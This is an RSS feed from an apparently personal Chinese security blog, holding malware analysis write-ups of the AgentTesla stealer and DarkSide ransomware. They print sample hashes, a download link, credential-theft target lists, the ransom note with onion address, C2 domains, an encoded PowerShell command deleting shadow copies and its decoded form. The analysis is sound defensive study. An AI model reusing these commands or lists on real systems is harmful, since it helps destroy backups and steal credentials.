<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Media on alee</title>
		<link>https://www.a1ee.cn/medium/</link>
		<description>Recent content in Media on alee</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>zh-cn</language>
		<lastBuildDate>Thu, 24 Jun 2021 15:22:11 +0800</lastBuildDate>
		<atom:link href="https://www.a1ee.cn/medium/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>AgentTesla</title>
			<link>https://www.a1ee.cn/medium/agenttesla/</link>
			<pubDate>Thu, 24 Jun 2021 15:22:11 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/agenttesla/</guid>
			<description>AgentTesla窃密木马样本分析 1. 简介 Agent Tesla 是一种密码窃取间谍软件，自 2014 年以来一直存在。攻击者可以使用该恶意软件来监视受害者，使他们能够查</description>
			<content type="html"><![CDATA[<h1 id="agenttesla窃密木马样本分析">AgentTesla窃密木马样本分析</h1>
<h2 id="1-简介">1. 简介</h2>
<p>Agent Tesla 是一种密码窃取间谍软件，自 2014 年以来一直存在。攻击者可以使用该恶意软件来监视受害者，使他们能够查看在支持的程序和网络浏览器中输入的所有内容。</p>
<p>Agent Tesla 病毒在其自己的网站上进行营销和销售，该网站错误地声称该程序是为个人使用而创建的合法键盘记录器，因此在黑客社区中非常流行。不仅仅是因为它的易用性和技术支持，可以在攻击者出售此恶意软件的“官方”网站以及专用的 Discord 服务器上找到。尽管声称该软件是合法的，但售卖人员还是会就非法使用该病毒提出建议。</p>
<h2 id="2-样本详情">2. 样本详情</h2>
<p>本次分析的样本哈希如下：</p>
<pre><code>MD5：af98b88c0b5dc353fbe536bd6fb8c4ec
SHA256：cc262fd3fa1f646aff2f5bcdea33beca5ed081260028b8604d5f714dd23c03ac
</code></pre><p>可以从<a href="https://app.any.run/tasks/84fc78ab-2695-4a5a-9a89-45f2497c38de/">any.run沙箱</a>查看到样本的行为及下载样本。</p>
<p>将样本用PEStudio打开，可以看到<code>Mircrosoft</code>将其标记为<code>AgentTesla</code>：</p>
<p><img src="/tesla_images/1832029179083.png" alt=""></p>
<p><code>libraries</code>标签可以看出这是一个.NET程序，且<code>strings</code>标签内字符串数量有点多，<code>version</code>标签中可以获取到样本的原始文件名及哈希情况：</p>
<p><img src="/tesla_images/3350431166950.png" alt=""></p>
<h2 id="3-样本分析">3. 样本分析</h2>
<p>使用<code>dnSpy</code>加载样本，向下观察代码，可以在<code>Helper</code>类中找到<code>Gzip</code>其中存放了约<code>10000</code>行数据，向下阅读代码，是<code>C#</code>中常用的解压缩函数<code>GZipStream</code>：</p>
<ol>
<li><img src="/tesla_images/5397454179785.png" alt=""></li>
</ol>
<h3 id="31-样本释放">3.1. 样本释放</h3>
<p>在<code>retrun result</code>处下断，得到了解压内存存放的内存地址<code>0x00027800</code>，在内存窗口中查看，可以明显看出是<code>PE</code>文件结构：</p>
<p><img src="/tesla_images/1477230100659.png" alt=""></p>
<p>使用<code>dnSpy</code>自带的保存功能，将该地址处存放的数据保存到本地，再使用<code>PEStudio</code>查看，这是一个名为：<code>Ihinax.dll</code>的<code>.NET</code>文件。</p>
<p><img src="/tesla_images/2901937119085.png" alt=""></p>
<p><code>Ihinax.dll</code>函数名经过了混淆，经过了长时间的阅读，在<code>LVU3WCMrRsWDmqar8f</code>空间下的<code>Su370LNVnsglWDN9lR</code>类的第311行，找到了<code>gzipStream</code>，下断点执行到此处，<code>array2</code>中所存放的内容是<code>PE</code>文件格式的内容。</p>
<p><img src="/tesla_images/2984344106952.png" alt=""></p>
<p>保存下来，使用<code>PEStudio</code>查看：</p>
<p><img src="/tesla_images/2175446127118.png" alt=""></p>
<p>这里推荐使用互联网工具对文件进行解压。<a href="https://www.unpac.me/results/01c9a92b-100b-4d9d-93cb-56a9029a0026#/">UnpacMe解压</a>结果如下：</p>
<p><img src="/tesla_images/1678414182094.png" alt=""></p>
<p>将手动解压与<code>UnpacMe</code>解压的内容进行<code>SHA256</code>比较，并无差别：</p>
<p><img src="/tesla_images/4437048119787.png" alt=""></p>
<h3 id="32-样本解码">3.2. 样本解码</h3>
<p>使用<code>dnSpy</code>加载最终的恶意程序，进入主函数可以看到一些奇怪的函数，<code>GetEnvironmentVariable</code>函数是用于获取系统变量的，参数却是函数<code>97085277-F30F-47FA-9C3D-82DA9E6730B4.L()</code>。</p>
<p><img src="/tesla_images/4581331127121.png" alt=""></p>
<p>进入其中可以看到类中有个类似于解密的东西，然后下方的方法进行方法传递：</p>
<p><img src="/tesla_images/3794127100662.png" alt=""></p>
<p>解密字符集：</p>
<p><img src="/tesla_images/3522028119088.png" alt=""></p>
<p><img src="/tesla_images/3441329106955.png" alt=""></p>
<p>这里可以使用<code>de4dot</code>对其进行动态解密，作者在<code>readme</code>中进行了如下说明：</p>
<p><img src="/tesla_images/1697150189976.png" alt=""></p>
<p><code>de4dot</code>对<code>--strtyp</code>参数的说明如下：</p>
<pre><code>String decrypter types
  none             Don't decrypt strings
  default          Use default string decrypter type (usually static)
  static           Use static string decrypter if available
  delegate         Use a delegate to call the real string decrypter
  emulate          Call real string decrypter and emulate certain instructions
</code></pre><p>这里选取了<code>emulate</code>进行尝试，但是作者显然并不想我们这么容易就解除了混淆，加密字符串居然有<code>6000535h - 600022Bh = 30Ah</code>处！</p>
<p><img src="/tesla_images/440434116345.png" alt=""></p>
<p>所以我简单生成了一个粗糙的bat：</p>
<pre><code>de4dot.exe dump2.bin --strtyp emulate --strtok 600022B
rename dump2-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 600022C
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 600022D
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 600022E
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 600022F
del dump3.bin
rename dump3-cleaned.bin dump3.bin
……
……
……
de4dot.exe dump3.bin --strtyp emulate --strtok 6000533
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 6000534
del dump3.bin
rename dump3-cleaned.bin dump3.bin
de4dot.exe dump3.bin --strtyp emulate --strtok 6000535
del dump3.bin
rename dump3-cleaned.bin dump3.bin
</code></pre><p>在经过了大约二十分钟后，我获得了一个解密后的程序：</p>
<p><img src="/tesla_images/115833119790.png" alt=""></p>
<h3 id="33-代码阅读">3.3. 代码阅读</h3>
<p>对于<code>C#</code>程序，既然字符串已经还原了，个人习惯是先阅读代码，然后就会有如下的这些发现。</p>
<h4 id="331-设置开机自启">3.3.1. 设置开机自启</h4>
<p><img src="/tesla_images/3034945140663.png" alt=""></p>
<h4 id="332-获取本机公网ip">3.3.2. 获取本机公网ip</h4>
<p><img src="/tesla_images/18847159089.png" alt=""></p>
<h4 id="333-下载文件">3.3.3. 下载文件</h4>
<p><img src="/tesla_images/1613451167122.png" alt=""></p>
<h4 id="334-获取系统信息">3.3.4. 获取系统信息</h4>
<p><img src="/tesla_images/2452553159791.png" alt=""></p>
<h4 id="335-截取屏幕">3.3.5. 截取屏幕</h4>
<p><img src="/tesla_images/5994156156346.png" alt=""></p>
<h4 id="336-ftp服务操作">3.3.6. FTP服务操作</h4>
<p><img src="/tesla_images/764505162100.png" alt=""></p>
<h4 id="337-浏览器用户数据窃取">3.3.7. 浏览器用户数据窃取</h4>
<p><img src="/tesla_images/3854308179980.png" alt=""></p>
<h4 id="338-smtp请求配置">3.3.8. SMTP请求配置</h4>
<p><img src="/tesla_images/2423011177584.png" alt=""></p>
<h4 id="339-键盘记录">3.3.9. 键盘记录</h4>
<p><img src="/tesla_images/4989936183004.png" alt=""></p>
<h4 id="3310-socket通信">3.3.10. SOCKET通信</h4>
<p><img src="/tesla_images/630324175086.png" alt=""></p>
<h4 id="3311-数据上传">3.3.11. 数据上传</h4>
<p><img src="/tesla_images/5323027156327.png" alt=""></p>
<h4 id="3312-des加密">3.3.12. DES加密</h4>
<p><img src="/tesla_images/4082929178767.png" alt=""></p>
<h4 id="3313-判断操作系统版本">3.3.13. 判断操作系统版本</h4>
<p><img src="/tesla_images/1222354160583.png" alt=""></p>
<h4 id="3314-特殊软件的凭证窃取">3.3.14. 特殊软件的凭证窃取</h4>
<p>特殊软件的凭证窃取（下图是Edge浏览器的窃取函数段）</p>
<p><img src="/tesla_images/3238651188043.png" alt=""></p>
<p>从Edge凭证窃取函数可以看出，窃取函数存在以下特征：</p>
<pre><code>UserName =
Password =
Browser = &quot;&quot;
</code></pre><p>检索全部代码，反复确认后，发现窃取目标包含以下对象：</p>
<pre><code>Browser = &quot;IE/Edge&quot;
Browser = &quot;Edge Chromium&quot;
Browser = &quot;QQ Browser&quot;
Browser = &quot;incredimail&quot;
x.Browser = &quot;Eudora&quot;
Browser = &quot;Falkon Browser&quot;
Browser = &quot;Falkon Browser&quot;
Browser = &quot;ClawsMail&quot;
Browser = &quot;Flock Browser&quot;
Browser = &quot;DynDNS&quot;
x.Browser = &quot;Psi/Psi+&quot;
x.Browser = &quot;Open VPN&quot;
x.Browser = &quot;FileZilla&quot;
Browser = &quot;WinSCP&quot;
Browser = &quot;FlashFXP&quot;
x.Browser = &quot;FTP Navigator&quot;
x.Browser = &quot;JDownloader&quot;
Browser = &quot;Paltalk&quot;
Browser = &quot;Pidgin&quot;
Browser = &quot;SmartFTP&quot;
x.Browser = &quot;WS_FTP&quot;
Browser = &quot;FTPCommander&quot;
x.Browser = &quot;FTPGetter&quot;
Browser = &quot;NO-IP&quot;
Browser = &quot;NO-IP&quot;
Browser = &quot;TheBat&quot;
x.Browser = &quot;Becky!&quot;
Browser = &quot;Trillian&quot;
x.Browser = &quot;Outlook&quot;
x.Browser = &quot;Foxmail&quot;
x.Browser = &quot;Opera Mail&quot;
x.Browser = &quot;PocoMail&quot;
Browser = &quot;eM Client&quot;
x.Browser = &quot;Mailbird&quot;
x.Browser = &quot;Mailbird&quot;
Browser = &quot;NordVPN&quot;
Browser = &quot;MySQL Workbench&quot;
Browser = &quot;Private Internet Access&quot;
x.Browser = &quot;Safari Browser&quot;
x.Browser = &quot;Internet Download Manager&quot;
</code></pre><h4 id="3315-vnc凭证窃取">3.3.15. VNC凭证窃取</h4>
<p><img src="/tesla_images/1320920203013.png" alt=""></p>
<h4 id="3316-下载tor浏览器">3.3.16. 下载Tor浏览器</h4>
<p><img src="/tesla_images/4431331170914.png" alt=""></p>
<h3 id="34-动态调试">3.4. 动态调试</h3>
<p>进入程序入口，会生成一串字符串，用于标识受害者主机，然后会设置一个30s的定时循环任务，接着开始进行浏览器用户数据窃取；</p>
<p><img src="/tesla_images/2016144140664.png" alt=""></p>
<p>汇总如下：</p>
<pre><code>@&quot;C:\Users\alee\AppData\Local\7Star\7Star\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\uCozMedia\Uran\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\MapleStudio\ChromePlus\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Yandex\YandexBrowser\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Torch\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Coowon\Coowon\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Comodo\Dragon\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Sputnik\Sputnik\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Iridium\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Vivaldi\User Data&quot;
@&quot;C:\Users\alee\AppData\Roaming\Opera Software\Opera Stable&quot;
@&quot;C:\Users\alee\AppData\Local\Chedot\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\CocCoc\Browser\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer&quot;
@&quot;C:\Users\alee\AppData\Local\Epic Privacy Browser\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Elements Browser\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Amigo\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\CatalinaGroup\Citrio\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\BraveSoftware\Brave-Browser\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\360Chrome\Chrome\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Kometa\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\liebao\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\CentBrowser\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\QIP Surf\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Chromium\User Data&quot;
@&quot;C:\Users\alee\AppData\Local\Orbitum\User Data&quot;
</code></pre><p>然后会在每一个目录下寻找<code>logins</code>文件夹，窃取其中的信息</p>
<p><img src="/tesla_images/4256159090.png" alt=""></p>
<p>针对<code>logins</code>内的文件窃取函数内容如下：</p>
<p><img src="/tesla_images/4252004160664.png" alt=""></p>
<p>往下则是一列窃取函数的调用，核实并整理后如下：</p>
<pre><code>list.AddRange(global::A.b.E.LoginsSteal(x.A, x.A));
list.AddRange(global::A.b.E.RimArtsSteal());
list.AddRange(global::A.b.E.ChromeSteal());
list.AddRange(global::A.b.E.FlockSteal());
list.AddRange(global::A.b.E.IceDragonSteal());
list.AddRange(global::A.b.E.OpearMailSteal());
list.AddRange(global::A.b.E.GetOSVersion());
list.AddRange(global::A.b.E.ClawsMailSteal());
list.AddRange(global::A.b.E.PostboxSteal());
list.AddRange(global::A.b.E.AppleSteal());
list.AddRange(global::A.b.E.IncrediMailSteal());
list.AddRange(global::A.b.E.BlackHawkSteal());
list.AddRange(global::A.b.E.IceCatSteal());
list.AddRange(global::A.b.E.WaterFoxSteal());
list.AddRange(global::A.b.E.PocomailSteal());
list.AddRange(global::A.b.E.UCBrowserSteal());
list.AddRange(global::A.b.E.FileZillaSteal());
list.AddRange(global::A.b.E.FirefoxSteal());
list.AddRange(global::A.b.E.WinSCP_2_Steal());
list.AddRange(global::A.b.E.FalkonSteal());
list.AddRange(global::A.b.E.QQBrowserSteal());
list.AddRange(global::A.b.E.CyberFoxSteal());
list.AddRange(global::A.b.E.SeaMonkeySteal());
list.AddRange(global::A.b.E.K-MeleonSteal());
list.AddRange(global::A.b.E.OutLookSteal());
list.AddRange(global::A.b.E.FoxmailSteal());
list.AddRange((IEnumerable&lt;global::A.b.X&gt;)global::A.b.E.EudoraSteal());
list.AddRange(global::A.b.E.ThunderbirdSteal());
list.AddRange(global::A.b.E.PaleMoonSteal());
</code></pre><h2 id="4-总结">4. 总结</h2>
<p>AgentTesla是一款商业窃密木马，当中还存在某些交互并未深入分析，不过基础模块已经很清晰了，从这些模块可以看出大多是针对浏览器和邮件客户端的窃密。这里提醒大家尽量不要在浏览器中保存密码，在使用邮件客户端时，也应当格外小心。</p>
]]></content>
		</item>
		
		<item>
			<title>DarksideRansomware</title>
			<link>https://www.a1ee.cn/medium/darksideransomware/</link>
			<pubDate>Tue, 25 May 2021 10:56:10 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/darksideransomware/</guid>
			<description>DarksideRansomware样本分析 样本信息 本次分析的样本来源于MALWAREbazaar。具体的SHA、MD5如下： SHA256 hash:151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5 SHA1 hash:eeb28144f39b275ee1ec008859e80f215710dc57 MD5 hash:9d418ecc0f3bf45029263b0944236884 本</description>
			<content type="html"><![CDATA[<h1 id="darksideransomware样本分析">DarksideRansomware样本分析</h1>
<h2 id="样本信息">样本信息</h2>
<p>本次分析的样本来源于<a href="https://bazaar.abuse.ch/sample/151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5/">MALWAREbazaar</a>。具体的SHA、MD5如下：</p>
<pre><code>SHA256 hash:151fbd6c299e734f7853497bd083abfa29f8c186a9db31dbe330ace2d35660d5
SHA1 hash:eeb28144f39b275ee1ec008859e80f215710dc57
MD5 hash:9d418ecc0f3bf45029263b0944236884
</code></pre><p>本次分析的环境是：<code>windows 7 ultimate sp1 x64</code></p>
<h2 id="样本分析">样本分析</h2>
<h3 id="去除重定位">去除重定位</h3>
<p>因为是在win7上做调试，使用LordPE关闭程序的重定位（为了方便写注释），由于该样本逻辑并不复杂，所以也可以不做这一步。</p>
<p><img src="/darkside_images/3185806156853.png" alt=""></p>
<p>（注：为方便区分，关闭重定向后的样本名为：Darkside.exe）</p>
<h3 id="普通用户权限运行样本">普通用户权限运行样本</h3>
<p>从函数功能及运行流程可以得出：当样本感染了一台主机后，会动态加载自身所需的dll，接着释放使用的字符串，然后判断当前执行权限是否是admin权限，如果不是，则进行提权，然后用管理员权限重载自身。</p>
<p><img src="/darkside_images/3132437176854.png" alt=""></p>
<h4 id="加载dll函数">加载dll函数</h4>
<p>dll的加载又解密函数解密dll名称，再使用<code>loardlibrary</code>加载。解密函数核心流程如下：</p>
<p><img src="/darkside_images/3880452197020.png" alt=""></p>
<p>最后解出来的dll名称为：</p>
<pre><code>ntdll,kernel32,advapi32,shell32,ole32,oleaut32,mpr,iphlpapi,shlwapi,gdi32,user32,netapi32,wsock32,wininet,wtsapi32
</code></pre><h4 id="字符串解析">字符串解析</h4>
<p>以下就是字符串解析的核心算法：</p>
<p><img src="/darkside_images/5527236106855.png" alt=""></p>
<p>当解密函数运行结束，可以看到以下调用关系：</p>
<p><img src="/darkside_images/1727847127021.png" alt=""></p>
<p>手动导出字符串，内容如下：</p>
<pre><code>$recycle.bin，config.msi，$windows.~bt，$windows.~ws，windows，appdata，application data，boot，google，mozilla，program files，program files (x86)，programdata，system volume information，tor browser，windows.old，intel，msocache，perflogs，x64dbg，public，all users，default

autorun.inf，boot.ini，bootfont.bin，bootsect.bak，desktop.ini，iconcache.db，ntldr，ntuser.dat，ntuser.dat.log，ntuser.ini，thumbs.db

386，adv，ani，bat，bin，cab，cmd，com，cpl，cur，deskthemepack，diagcab，diagcfg，diagpkg，dll，drv，exe，hlp，icl，icns，ico，ics，idx，ldf，lnk，mod，mpa，msc，msp，msstyles，msu，nls，nomedia，ocx，prf，ps1，rom，rtp，scr，shs，spl，sys，theme，themepack，wpx，lock，key，hta，msi，pdb

backup

sql，sqlite

vmcompute.exe，vmms.exe，vmwp.exe，svchost.exe，TeamViewer.exe，explorer.exe

sql，oracle，ocssd，dbsnmp，synctime，agntsvc，isqlplussvc，xfssvccon，mydesktopservice，ocautoupds，encsvc，firefox，tbirdconfig，mydesktopqos，ocomm，dbeng50，sqbcoreservice，excel，infopath，msaccess，mspub，onenote，outlook，powerpnt，steam，thebat，thunderbird，visio，winword，wordpad，notepad

vss，sql，svc$，memtas，mepocs，sophos，veeam，backup，GxVss，GxBlr，GxFWD，GxCVD，GxCIMgr

securebestapp20.com，temisleyes.com

All of your files are encrypted! Find %s and Follow Instructions!

----------- [ Welcome to DarkSide ] -------------&gt;

What happend?
----------------------------------------------
Your computers and servers are encrypted, backups are deleted. We use strong encryption algorithms, so you cannot decrypt your data. .. But you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your network
Follow our instructions below and you will recover all your data.

What guarantees?
----------------------------------------------
We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.
All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems.
We guarantee to decrypt one file for free. Go to the site and contact us.

How to get access on website?
----------------------------------------------
Using a TOR browser:
1) Download and install TOR browser from this site: https://torproject.org/
2) Open our website: http://darksidfqzcuhtk2.onion/CZEX8E0GR0AO4ASUCJE1K824OKJA1G24B8B3G0P84LJTTE7W8EC86JBE7NBXLMRT

When you open our website, put the following data in the input form:
Key
:0kZdK3HQhsAkUtvRl41QkOdpJvzcWnCrBjjgg5U4zfuWeTnZR5Ssjd3QLHpmbjxjo7uWzKbt8qPVuYN38TsDPI3bemd5I40ksemIzuI5OhIHZsi9cn3Wpd7OUT72FP9MyAUzR586yMsI2Ygri9in0Bf4EkG0pmBOLyRG1T788foGJQW1WxS1Qd2sMVvX0jKlbGG1zLp7g0u6buDCzSMyTjWjuVzJYufBBv7S2XvciEVvboiTNbZA4UUU6PttKERQSb018aILd6xO3ulk6fbEgZDO5tZSGn2zRevn5YXnHtg6vt1ToLe3izQOgYbs8Ja1fkfJBUYVux1ITyWBjpn0xPayKfwln8SqgMkbqiDyxEDEtFhqiffLcONMhi4TmW50loZIC6mWSaOjThWp6XSJUWPtY8Mkzs8Cs0qjPahx58iAEVIRGUVpLkMs7xPN7ydZ6wMWaOcRC1AD1JEUVTjLikXXyckgYaS6FnEv0UNEsv6QbTLSpDomIg3rEYZBib6ozrwH5n0M5wrKo8NciUBmfJWDP4XKkjznpsa05rEpuAklM0dMmZsYGVR

!!! DANGER !!!
DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them.
!!! DANGER !!!
</code></pre><h4 id="访问令牌读取函数">访问令牌读取函数</h4>
<p>进入函数内部，根据api调用情况可以看到该函数结构简单：</p>
<p><img src="/darkside_images/2427851119690.png" alt=""></p>
<p>这里有两个判断较为重要</p>
<pre><code>cmp dword ptr ds:[eax+0x8], 0x20
cmp dword ptr ds:[eax+0xC], 0x220
</code></pre><p>在微软官方的<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids">安全标识符说明</a>中可以找到sid的值为32和544的角色权限分别如下：</p>
<p><img src="/darkside_images/5706513170561.png" alt=""></p>
<p><img src="/darkside_images/5203714188987.png" alt=""></p>
<p>如果没有这两个权限，那么将不会进行uac提权。</p>
<h4 id="提权和重载自身函数">提权和重载自身函数</h4>
<p>该部分均为api调用，较为简单明了。</p>
<p><img src="/darkside_images/2970710126245.png" alt=""></p>
<h3 id="管理员权限运行样本">管理员权限运行样本</h3>
<p>当样本获得了管理员权限，那么自然是要进行加密操作了，在此之前，它将会通过crc32计算后缀名用于图标生成和加密文件字符串添加；检索本地语言；发送信息至服务器；删除本地卷影；检索本地磁盘空闲空间；加密所有文件；自我删除。</p>
<h4 id="后缀名生成函数">后缀名生成函数</h4>
<p>该函数主要是<code>crc32计算</code>。图标的名字来源于uuid，通过了4次crc32计算</p>
<p><img src="/darkside_images/5111541121999.png" alt=""></p>
<p>crc32计算函数如下：</p>
<p><img src="/darkside_images/4693844139879.png" alt=""></p>
<h4 id="本地语言判断函数">本地语言判断函数</h4>
<p>样本会获取本地<code>默认ui语言</code>和<code>区域格式语言</code>，如果是<code>白名单</code>内的语言，则退出，不是则进行下一步。语言判断函数部分核心如下：</p>
<p><img src="/darkside_images/1011651136226.png" alt=""></p>
<p>从<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lcid/70feba9f-294e-491e-b6eb-56532684c37f">Windows语言代码标识符（LCID）参考</a>中得知，本地语言所有判断如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">序号</th>
<th style="text-align:center">语言代码（hex）</th>
<th style="text-align:center">标识符</th>
<th style="text-align:center">语种</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">419</td>
<td style="text-align:center">ru-RU</td>
<td style="text-align:center">俄语</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">422</td>
<td style="text-align:center">uk-UA</td>
<td style="text-align:center">乌克兰语</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">423</td>
<td style="text-align:center">be-BY</td>
<td style="text-align:center">白俄罗斯语</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">428</td>
<td style="text-align:center">tg-Cyrl-TJ</td>
<td style="text-align:center">塔吉克语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">42B</td>
<td style="text-align:center">hy-AM</td>
<td style="text-align:center">亚美尼亚语</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">42C</td>
<td style="text-align:center">az-Latn-AZ</td>
<td style="text-align:center">阿塞拜疆语（拉丁语）</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">437</td>
<td style="text-align:center">ka-GE</td>
<td style="text-align:center">格鲁吉亚语</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">43F</td>
<td style="text-align:center">kk-KZ</td>
<td style="text-align:center">哈萨克语</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">440</td>
<td style="text-align:center">ky-KG</td>
<td style="text-align:center">吉尔吉斯语</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td style="text-align:center">442</td>
<td style="text-align:center">tk-TM</td>
<td style="text-align:center">土库曼语（拉丁语）</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td style="text-align:center">443</td>
<td style="text-align:center">uz-Latn-UZ</td>
<td style="text-align:center">乌兹别克语（拉丁语）</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td style="text-align:center">444</td>
<td style="text-align:center">tt-RU</td>
<td style="text-align:center">塔塔尔语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td style="text-align:center">818</td>
<td style="text-align:center">ro-MD</td>
<td style="text-align:center">罗马尼亚语（摩尔多瓦）</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td style="text-align:center">819</td>
<td style="text-align:center">ru-MD</td>
<td style="text-align:center">俄语（摩尔多瓦）</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td style="text-align:center">82C</td>
<td style="text-align:center">az-Cyrl-AZ</td>
<td style="text-align:center">阿塞拜疆语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td style="text-align:center">843</td>
<td style="text-align:center">uz-Cyrl-UZ</td>
<td style="text-align:center">乌兹别克语（西里尔文）</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td style="text-align:center">2801</td>
<td style="text-align:center">ar-SY</td>
<td style="text-align:center">阿拉伯语（叙利亚）</td>
</tr>
</tbody>
</table>
<h4 id="发送信息至服务器函数">发送信息至服务器函数</h4>
<p>将本地的系统相关信息发送到攻击者的服务器：json格式内容如下：</p>
<pre><code>{
	&quot;bot&quot;:{
	&quot;ver&quot;:&quot;1.8.6.2&quot;,
	&quot;uid&quot;:&quot;060108efb510c98&quot;
	},
	&quot;os&quot;:{
	&quot;lang&quot;:&quot;zh-CN&quot;,
	&quot;username&quot;:&quot;alee&quot;,
	&quot;hostname&quot;:&quot;WIN-B1ESUN1R9U8&quot;,
	&quot;domain&quot;:&quot;WORKGROUP&quot;,
	&quot;os_type&quot;:&quot;windows&quot;,
	&quot;os_version&quot;:&quot;Windows 7 Ultimate&quot;,
	&quot;os_arch&quot;:&quot;x64&quot;,
	&quot;disks&quot;:&quot;C:72/99&quot;,
	&quot;id&quot;:&quot;826dfd7bd5985bdbd259&quot;
	}
}
</code></pre><p>服务器为：<code>securebestapp20.com</code></p>
<h4 id="删除本地卷影">删除本地卷影</h4>
<p>核心代码如下：</p>
<p><img src="/darkside_images/5604835168666.png" alt=""></p>
<p>powershell命令如下：</p>
<pre><code>40B5E2:L&quot;powershell -ep bypass -c \&quot;(0..61)|%{{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))}};iex $s\&quot;&quot;
</code></pre><p>将十六进制转换成字符串如下：</p>
<pre><code>Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
</code></pre><h4 id="检索本地磁盘空闲空间">检索本地磁盘空闲空间</h4>
<p>空闲空间检索存在两个判断，但至少保证有100mb才会进行下一步。</p>
<p><img src="/darkside_images/192720173802.png" alt=""></p>
<h4 id="加密所有文件">加密所有文件</h4>
<p>从动态调试中可以找到加密主函数的地址，在ida中呈现如下：</p>
<p><img src="/darkside_images/1604535140565.png" alt=""></p>
<p>进入其中可发现流程如下：</p>
<p><img src="/darkside_images/4085142188991.png" alt=""></p>
<p>进入加密流程可以看到：会检索文件结构，然后递归对文件进行加密。</p>
<p><img src="/darkside_images/2721245176858.png" alt=""></p>
<p>深入到加密操作中，发现会首先进行是否加密判断，未加密则重命名：</p>
<p><img src="/darkside_images/3495450197024.png" alt=""></p>
<p>对文件内容进行rsa1028加密，并生成加密文件：</p>
<p><img src="/darkside_images/2789151189693.png" alt=""></p>
<h4 id="自我删除">自我删除</h4>
<p>自我删除的主函数如下：</p>
<p><img src="/darkside_images/33802100566.png" alt=""></p>
<p>使用<code>Procmon</code>检测到的指令如下：</p>
<pre><code>&quot;C:\Windows\system32\cmd.exe&quot; /C DEL /F /Q C:\Users\alee\Desktop\DARKSI~1\Darkside.exe &gt;&gt; NUL
</code></pre><p>在命令行使用<code>cmd /?</code>可以了解到：</p>
<pre><code>/C      执行字符串指定的命令然后终止
/Q      关闭回显
/F      启用文件和目录名完成字符
</code></pre><h2 id="总结">总结</h2>
<p>这是我第二次做样本分析，其中遇到了很多问题，api的熟悉度这个是一个经验问题，另外两个问题是最为严重的：</p>
<ul>
<li>ida动态链接库的引入</li>
<li>由汇编代码判断加密方式</li>
</ul>
<p>第一个问题如果不是有现成的<code>idapython</code>脚本，那我将不可能完成本次分析，所以深入了解<code>idapython</code> 脚本的编写是很有必要的；</p>
<p>第二个问题则需要通过对更多样本的分析，或自我构建加密程序进行分析才能够弥补差距。后续将采用两种方式并进的模式进行能力增强。</p>
<p>最后本次分析参考了很多前辈分享的资料，感谢大家的无私分享。</p>
<p>参考资料：<code>https://chuongdong.com/reverse%20engineering/2021/05/06/DarksideRansomware/</code></p>
]]></content>
		</item>
		
		<item>
			<title>Incaseformat</title>
			<link>https://www.a1ee.cn/medium/incaseformat/</link>
